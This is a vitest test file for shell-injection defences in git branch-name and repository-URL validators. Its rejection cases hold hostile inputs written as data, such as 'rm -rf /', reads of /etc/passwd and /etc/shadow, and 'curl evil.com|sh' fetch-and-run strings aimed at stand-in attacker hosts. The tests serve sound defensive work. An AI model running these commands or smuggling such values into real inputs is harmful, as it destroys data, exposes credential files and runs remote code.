/**
 * SH-2 — workspace-lifecycle Shell Injection Tests
 *
 * Verifies that branch names and repository URLs are validated before use,
 * preventing shell metacharacter injection via git clone arguments.
 *
 * Tests cover:
 *   - malicious branch payloads (shell metacharacters, path traversal)
 *   - malicious repository URLs (shell metacharacters, non-git schemes)
 *   - valid inputs that should be accepted without error
 */

import { describe, it, expect } from "vitest";
import { validateBranch, validateRepoUrl } from "../workspace-lifecycle";

// ── validateBranch — rejection cases ─────────────────────────────────────────

describe("validateBranch — rejects malicious payloads", () => {
  it("rejects a branch with a semicolon (command injection)", () => {
    expect(() => validateBranch("main; rm -rf /")).toThrow(/Invalid branch name/);
  });

  it("rejects a branch with a pipe character", () => {
    expect(() => validateBranch("main|cat /etc/passwd")).toThrow(/Invalid branch name/);
  });

  it("rejects a branch with a backtick (command substitution)", () => {
    expect(() => validateBranch("main`whoami`")).toThrow(/Invalid branch name/);
  });

  it("rejects a branch with a dollar sign (variable expansion)", () => {
    expect(() => validateBranch("main$(curl attacker.com)")).toThrow(/Invalid branch name/);
  });

  it("rejects a branch with a space", () => {
    expect(() => validateBranch("main branch")).toThrow(/Invalid branch name/);
  });

  it("rejects a branch with double-dot path traversal", () => {
    expect(() => validateBranch("../../etc/shadow")).toThrow(/Invalid branch name/);
  });

  it("rejects a branch starting with a slash", () => {
    expect(() => validateBranch("/etc/passwd")).toThrow(/Invalid branch name/);
  });

  it("rejects a branch ending with a slash", () => {
    expect(() => validateBranch("feature/")).toThrow(/Invalid branch name/);
  });

  it("rejects an empty branch name", () => {
    expect(() => validateBranch("")).toThrow(/Invalid branch name/);
  });

  it("rejects a branch name exceeding 255 characters", () => {
    expect(() => validateBranch("a".repeat(256))).toThrow(/Invalid branch name/);
  });

  it("rejects a branch with an ampersand (background job injection)", () => {
    expect(() => validateBranch("main&evil")).toThrow(/Invalid branch name/);
  });

  it("rejects newline injection in branch name", () => {
    expect(() => validateBranch("main\nrm -rf /")).toThrow(/Invalid branch name/);
  });
});

// ── validateBranch — acceptance cases ────────────────────────────────────────

describe("validateBranch — accepts valid branch names", () => {
  it("accepts a simple main branch", () => {
    expect(() => validateBranch("main")).not.toThrow();
  });

  it("accepts a feature branch with slashes", () => {
    expect(() => validateBranch("feature/new-login")).not.toThrow();
  });

  it("accepts a branch with digits", () => {
    expect(() => validateBranch("release/2.0.1")).not.toThrow();
  });

  it("accepts a branch with underscores", () => {
    expect(() => validateBranch("fix_auth_bug")).not.toThrow();
  });

  it("accepts a branch with dots (semver-style)", () => {
    expect(() => validateBranch("v1.2.3")).not.toThrow();
  });

  it("accepts a branch with dashes", () => {
    expect(() => validateBranch("hotfix-login-crash")).not.toThrow();
  });

  it("accepts a nested feature branch", () => {
    expect(() => validateBranch("feature/auth/oauth-refresh")).not.toThrow();
  });
});

// ── validateRepoUrl — rejection cases ────────────────────────────────────────

describe("validateRepoUrl — rejects malicious URLs", () => {
  it("rejects a URL with a semicolon (command injection)", () => {
    expect(() => validateRepoUrl("https://github.com/owner/repo.git; rm -rf /")).toThrow(/Invalid repository URL/);
  });

  it("rejects a URL with a pipe character", () => {
    expect(() => validateRepoUrl("https://github.com/repo|cat /etc/passwd")).toThrow(/Invalid repository URL/);
  });

  it("rejects a URL with backtick command substitution", () => {
    expect(() => validateRepoUrl("https://host.com/repo`curl evil.com|sh`")).toThrow(/Invalid repository URL/);
  });

  it("rejects a URL with a dollar-paren expansion", () => {
    expect(() => validateRepoUrl("https://host.com/repo$(id)")).toThrow(/Invalid repository URL/);
  });

  it("rejects a URL with spaces", () => {
    expect(() => validateRepoUrl("https://host.com/repo && curl evil.com")).toThrow(/Invalid repository URL/);
  });

  it("rejects a URL with a newline injection", () => {
    expect(() => validateRepoUrl("https://host.com/repo.git\nrm -rf /")).toThrow(/Invalid repository URL/);
  });

  it("rejects a file:// URL (local filesystem access)", () => {
    expect(() => validateRepoUrl("file:///etc/passwd")).toThrow(/Invalid repository URL/);
  });

  it("rejects an ftp:// URL (unexpected scheme)", () => {
    expect(() => validateRepoUrl("ftp://host.com/repo")).toThrow(/Invalid repository URL/);
  });

  it("rejects a bare hostname without a scheme", () => {
    expect(() => validateRepoUrl("github.com/owner/repo")).toThrow(/Invalid repository URL/);
  });

  it("rejects an empty URL", () => {
    expect(() => validateRepoUrl("")).toThrow(/Repository URL is required/);
  });

  it("rejects a URL containing a backslash", () => {
    expect(() => validateRepoUrl("https://host.com/repo\\..\\exploit")).toThrow(/Invalid repository URL/);
  });
});

// ── validateRepoUrl — acceptance cases ───────────────────────────────────────

describe("validateRepoUrl — accepts valid git remote URLs", () => {
  it("accepts an https:// GitHub URL", () => {
    expect(() => validateRepoUrl("https://github.com/owner/repo.git")).not.toThrow();
  });

  it("accepts an https:// URL with a token in userinfo position", () => {
    expect(() => validateRepoUrl("https://token@github.com/owner/repo.git")).not.toThrow();
  });

  it("accepts a git@ SSH URL", () => {
    expect(() => validateRepoUrl("git@github.com:owner/repo.git")).not.toThrow();
  });

  it("accepts a git@ SSH URL for GitLab", () => {
    expect(() => validateRepoUrl("git@gitlab.com:group/project.git")).not.toThrow();
  });

  it("accepts an ssh:// URL", () => {
    expect(() => validateRepoUrl("ssh://git@bitbucket.org/team/repo.git")).not.toThrow();
  });

  it("accepts a git:// URL", () => {
    expect(() => validateRepoUrl("git://github.com/owner/repo.git")).not.toThrow();
  });

  it("accepts a self-hosted https URL", () => {
    expect(() => validateRepoUrl("https://git.company.internal/team/project.git")).not.toThrow();
  });
});
